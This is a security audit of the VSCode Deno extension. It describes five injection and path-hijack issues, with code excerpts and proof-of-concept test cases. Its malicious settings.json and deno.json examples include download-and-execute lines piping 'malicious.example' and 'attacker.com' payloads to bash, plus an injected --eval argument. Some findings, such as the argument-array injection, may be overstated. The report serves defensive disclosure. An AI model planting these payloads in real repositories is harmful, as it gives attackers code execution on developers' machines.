# Vulnerabilities in VSCode Deno Extension

## 1. Command Injection through Import Map or Config Settings

**Description**: The Deno VSCode extension directly adds user-provided settings for `importMap` and `config` to command arguments when launching debugging sessions without proper validation or sanitization. An attacker can inject additional command-line arguments by manipulating these settings, leading to arbitrary command execution.

When a debugging session is initiated, the extension uses the values from these settings directly in the command line without validating if they contain only valid file paths. This allows an attacker to escape out of the intended parameter and inject additional commands.

**Impact**: An attacker can execute arbitrary code with the privileges of the VS Code process. This could lead to data exfiltration, system compromise, credential theft, or other malicious actions on the victim's system.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: None. The extension uses the settings values in command arguments without validation or sanitization.

**Missing Mitigations**: The extension should validate that `importMap` and `config` settings contain only valid file paths and no additional command-line arguments or shell metacharacters.

**Preconditions**:
- The victim must have the Deno extension installed
- The victim must open a malicious repository in VS Code
- The victim must launch a debugging session

**Source Code Analysis**:
In `debug_config_provider.ts`, the method `#getAdditionalRuntimeArgs()` constructs command arguments by directly using user settings:
```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  const settings = this.#extensionContext.clientOptions.initializationOptions();
  if (settings.unstable) {
    args.push("--unstable");
  }
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  if (settings.config) {
    args.push("--config");
    args.push(settings.config.trim());
  }
  return args;
}
```

These arguments are then used in `provideDebugConfigurations()` to build the debug configuration:
```typescript
async provideDebugConfigurations(): Promise<vscode.DebugConfiguration[]> {
  // ... code omitted ...
  const debugConfig: vscode.DebugConfiguration = {
    // ... other properties ...
    runtimeArgs: [
      "run",
      ...this.#getAdditionalRuntimeArgs(),
      this.#getInspectArg(),
      "--allow-all",
    ],
    // ... other properties ...
  };
  // ... code omitted ...
  return [debugConfig];
}
```

If an attacker can control the config value, they can inject malicious command-line arguments.

**Security Test Case**:
1. Create a malicious repository with a `.vscode/settings.json` file containing:
```json
{
  "deno.enable": true,
  "deno.config": "legitimate-config.json\" --allow-all --eval=\"Deno.writeFileSync('pwned.txt', new TextEncoder().encode('pwned'))\""
}
```
2. Include a simple Deno application in the repository
3. Open the repository in VS Code with the Deno extension installed
4. Launch a debugging session using the Deno: Launch Program configuration
5. Observe that the injected eval command executes, writing the file "pwned.txt" to the filesystem

## 2. Path Traversal and Arbitrary Command Execution via deno.path

**Description**: The extension resolves the Deno executable path based on the `deno.path` setting without sufficient validation. When this setting contains a relative path, the extension resolves it relative to workspace folders. An attacker can exploit this to execute arbitrary executables by placing a malicious executable in the workspace and configuring `deno.path` to point to it.

When a user opens a repository with a malicious `deno.path` configuration, the VSCode Deno extension resolves the Deno CLI executable path from this configuration. A malicious actor can provide a repository with a custom settings.json file that points the `deno.path` to a malicious executable. When the extension executes Deno operations (like starting the language server or running tests), it will execute this malicious executable instead of the legitimate Deno CLI.

**Impact**: An attacker can execute arbitrary code with the privileges of the VS Code process whenever the extension starts or restarts. Since the extension uses this executable for all Deno operations, the attacker's code would run whenever Deno commands are executed. The malicious executable could exfiltrate sensitive information, install malware, compromise the system, or perform any other actions available to the user.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: The extension checks if the file exists using `fileExists`, but this doesn't prevent executing a malicious executable if it exists.

**Missing Mitigations**:
- The extension should validate that the executable is a legitimate Deno executable, possibly by checking its version or signature.
- It should also restrict the `deno.path` setting to known safe locations or require absolute paths that aren't within the workspace.
- The extension should warn users with a security prompt when a custom `deno.path` is configured in a workspace
- The extension could implement a checksum verification of the Deno binary before execution

**Preconditions**:
- The victim must have the Deno extension installed
- The victim must open a malicious repository in VS Code
- The repository must contain an executable that the extension can access

**Source Code Analysis**:
In `util.ts`, the `getDenoCommandPath()` function resolves the Deno executable path:
```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);
      if (await fileExists(commandPath)) {
        return commandPath;
      }
    }
    return undefined;
  } else {
    return command;
  }
}
```

The function gets the path from user settings and, if relative, resolves it against workspace folders. If the resolved file exists, it returns that path without validating that it's actually a Deno executable.

In `commands.ts`, this path is used to spawn the language server:
```typescript
const command = await getDenoCommandPath();
// ...
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  // ...
};
```

**Security Test Case**:
1. Create a malicious executable named `fake-deno` that executes arbitrary code (e.g., a script that exfiltrates data or installs malware)
2. Place it in a repository at `.vscode/bin/fake-deno`
3. Add a `.vscode/settings.json` file with:
```json
{
  "deno.enable": true,
  "deno.path": ".vscode/bin/fake-deno"
}
```
4. Open the repository in VS Code with the Deno extension installed
5. Observe that when the extension activates, it executes the malicious executable instead of the real Deno executable

## 3. Environment Variable Manipulation via deno.envFile

**Description**: The extension reads an environment file specified by the `deno.envFile` setting and adds its content to the environment variables used when executing commands. There is no validation of the file content, allowing an attacker to manipulate critical environment variables that could affect command execution.

**Impact**: An attacker can manipulate environment variables used when executing commands, potentially leading to privilege escalation, command injection, or altering the behavior of executed commands. For example, by manipulating the PATH variable, an attacker could cause the extension to execute malicious binaries.

**Vulnerability Rank**: High

**Currently Implemented Mitigations**: None. The extension directly adds the environment file content to the command environment without validation.

**Missing Mitigations**: The extension should validate environment file content to prevent manipulation of security-critical variables such as PATH or LD_PRELOAD. It should also restrict which environment variables can be set.

**Preconditions**:
- The victim must have the Deno extension installed
- The victim must open a malicious repository in VS Code
- The repository must contain an environment file that can be parsed by the dotenv library

**Source Code Analysis**:
In `commands.ts`, the `startLanguageServer()` function reads an environment file and adds its content to the command environment:
```typescript
const denoEnvFile = config.get<string>("envFile");
if (denoEnvFile) {
  if (workspaceFolder) {
    const denoEnvPath = path.join(workspaceFolder.uri.fsPath, denoEnvFile);
    try {
      const content = fs.readFileSync(denoEnvPath, { encoding: "utf8" });
      const parsed = dotenv.parse(content);
      Object.assign(env, parsed);
    } catch (error) {
      vscode.window.showErrorMessage(
        `Could not read env file "${denoEnvPath}": ${error}`,
      );
    }
  }
}
```

This environment is then used when spawning the language server:
```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  // ...
};
```

Similar code exists in other functions that execute commands, such as the `test` function.

**Security Test Case**:
1. Create a malicious environment file named `malicious.env` containing:
```
PATH=./malicious:$PATH
DENO_NO_PROMPT=1
```
2. Create a malicious executable at `./malicious/deno` or `./malicious/deno.exe` on Windows
3. Add a `.vscode/settings.json` file with:
```json
{
  "deno.enable": true,
  "deno.envFile": "malicious.env"
}
```
4. Open the repository in VS Code with the Deno extension installed
5. Observe that when the extension executes Deno commands, it may use the malicious executable due to the modified PATH

## 4. Command Injection via Task Definitions in `deno.json`

**Description**: The VSCode Deno extension reads task definitions from `deno.json` files and makes them available in VS Code's task system. When a user executes a task, the command defined in the task is processed without proper validation or sanitization. This allows an attacker to craft a repository with malicious task definitions that, when executed, run arbitrary commands on the victim's system.

A threat actor can create a malicious repository containing a crafted `deno.json` file with task definitions that execute harmful commands. When the victim opens the repository and runs one of these tasks (which can be made to look harmless), arbitrary code execution occurs on the victim's machine.

**Impact**: An attacker could achieve Remote Code Execution on the victim's system. This could lead to data theft, system compromise, lateral movement within a network, or installation of additional malware.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: The extension requires explicit user action to run tasks, which provides some level of mitigation. However, users might not understand the implications of running a task from an untrusted repository.

**Missing Mitigations**:
- No validation of task commands to ensure they are safe to execute
- No warning prompts when running tasks from repositories that are not trusted
- No sandboxing of task execution to limit privileges

**Preconditions**:
1. Victim must open a repository containing a malicious `deno.json` file
2. Victim must either enable Deno for the workspace or manually run a task

**Source Code Analysis**:
In `tasks_sidebar.ts`, the extension reads task definitions from Deno configuration files:

```typescript
async provideTasks(): Promise<Task[]> {
  const process = await getDenoCommandName();
  const client = this.#extensionContext.client;
  const supportsConfigTasks = this.#extensionContext.serverCapabilities
    ?.experimental?.denoConfigTasks;
  if (!client || !supportsConfigTasks) {
    return [];
  }
  const tasks = [];
  try {
    const configTasks = await client.sendRequest(taskReq);
    for (const configTask of configTasks ?? []) {
      const task = buildDenoConfigTask(
        workspaceFolder,
        process,
        configTask.name,
        configTask.command ?? configTask.detail,
        Uri.parse(configTask.sourceUri),
      );
      tasks.push(task);
    }
  } catch (err) {
    // error handling
  }
  return tasks;
}
```

The `buildDenoConfigTask` function in `tasks.ts` then creates task objects without validating command content:

```typescript
export function buildDenoConfigTask(
  scope: vscode.WorkspaceFolder,
  process: string,
  name: string,
  command: string | undefined,
  sourceUri?: vscode.Uri,
): vscode.Task {
  // code that builds task arguments
  const task = new vscode.Task(
    {
      type: TASK_TYPE,
      name: name,
      command: "task",
      args,
      sourceUri,
    },
    scope,
    name,
    TASK_SOURCE,
    new vscode.ProcessExecution(process, ["task", ...args]),
    ["$deno"],
  );
  task.detail = `$ ${command}`;
  return task;
}
```

When a user runs the task (via the command palette, tasks sidebar, or task code lens), the command executes without any validation.

**Security Test Case**:
1. Create a repository with a `deno.json` file containing a malicious task:
   ```json
   {
     "tasks": {
       "innocent-looking-task": "echo 'Compromised!' && curl https://malicious.example/payload | bash"
     }
   }
   ```
2. Share this repository with a victim
3. When the victim opens the repository in VS Code with the Deno extension installed
4. The task will appear in the VS Code Tasks list and Tasks sidebar
5. If the victim runs the task, the malicious command will execute on their system
6. The command will display a message and download+execute a payload from the attacker's server

## 5. Command Injection via Debug Terminal

**Description**: The VSCode Deno extension's `#debugTask` function in `tasks_sidebar.ts` creates a debug terminal that executes a command string that includes the task name without proper escaping. A malicious repository can define a task with shell metacharacters in its name, which will be executed by the shell when the victim runs the task in the debug terminal.

Step by step exploitation:
1. Attacker creates a Deno project with a `deno.json` file containing a task with malicious shell commands in its name (e.g., `legitimate-task-name; curl -s http://attacker.com/payload | bash`)
2. Victim opens the project in VSCode with the Deno extension
3. When the victim runs the debug task through the extension interface, the shell metacharacters in the task name are interpreted by the shell
4. The injected commands execute with the victim's privileges

**Impact**: This vulnerability allows an attacker to execute arbitrary commands on the victim's system with the victim's privileges. The injected commands could exfiltrate sensitive information, install malware, or perform other malicious actions.

**Vulnerability Rank**: Critical

**Currently Implemented Mitigations**: There are no mitigations in place. The task name is inserted directly into the command string without any escaping or validation.

**Missing Mitigations**:
- The extension should properly escape task names before inserting them into command strings
- The extension could use VSCode's API to execute tasks directly instead of constructing command strings

**Preconditions**:
- The victim must open a repository with a malicious task definition
- The victim must run the malicious task using the debug functionality

**Source Code Analysis**:
In `tasks_sidebar.ts`, the `#debugTask` function creates a debug terminal:

```typescript
async #debugTask(task: DenoTask) {
  const command = `${await getDenoCommandName()} task ${task.task.name}`;
  commands.executeCommand(
    "extension.js-debug.createDebuggerTerminal",
    command,
    task.getFolder(),
    {
      cwd: path.dirname(task.denoJson.resourceUri!.fsPath),
    },
  );
}
```

The `task.task.name` is inserted directly into the command string without any escaping or validation. When the user runs the task in the debug terminal, the resulting command string (e.g., `deno task malicious-name; evil-command`) is executed by the shell. The shell interprets any metacharacters in the task name, potentially executing injected commands.

**Security Test Case**:
1. Create a Deno project with a `deno.json` file containing a malicious task:
   ```json
   {
     "tasks": {
       "legitimate-name; touch /tmp/deno-debug-injection-proof": "echo 'This is a legitimate task'"
     }
   }
   ```

2. Open the project in VSCode with the Deno extension installed.

3. Run the task in debug mode by right-clicking on the task in the Deno Tasks panel and selecting "Debug Task".

4. Verify that `/tmp/deno-debug-injection-proof` file was created, confirming the command injection.
